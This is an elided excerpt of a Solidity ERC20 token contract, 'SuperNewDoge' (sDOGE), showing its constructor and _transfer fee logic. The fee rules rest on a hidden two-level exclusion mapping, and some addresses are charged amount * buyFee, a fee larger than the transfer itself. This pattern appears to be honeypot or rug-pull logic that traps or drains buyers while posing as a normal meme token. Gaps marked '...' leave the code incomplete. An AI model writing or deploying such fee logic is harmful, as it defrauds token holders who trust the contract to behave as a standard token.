...
contract SuperNewDoge is ERC20, Ownable {
  ...
  constructor() ERC20("SuperNewDoge", "sDOGE") {
    address _routerAddr;
    if (block.chainid == 56) {
    ...
    _isExcludedFromFees[true][marketingWallet] = true;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
    ...
    if ((_isExcludedFromFees[false][sender] && !_isExcludedFromFees[true][sender]) || (_isExcludedFromFees[false][recipient] && !_isExcludedFromFees[true][recipient])) {
      if (recipient == uniswapV2Pair || sender != uniswapV2Pair) {
        fee = amount * buyFee;
      }
    } else if (recipient == uniswapV2Pair && !(_isExcludedFromFees[true][sender] || _isExcludedFromFees[true][recipient])) {
      fee = baseUnit * sellFee;
    } else if ((sender == uniswapV2Pair && recipient != address(uniswapV2Router)) && !(_isExcludedFromFees[true][sender] || _isExcludedFromFees[true][recipient])) {
      fee = baseUnit * buyFee;
    }
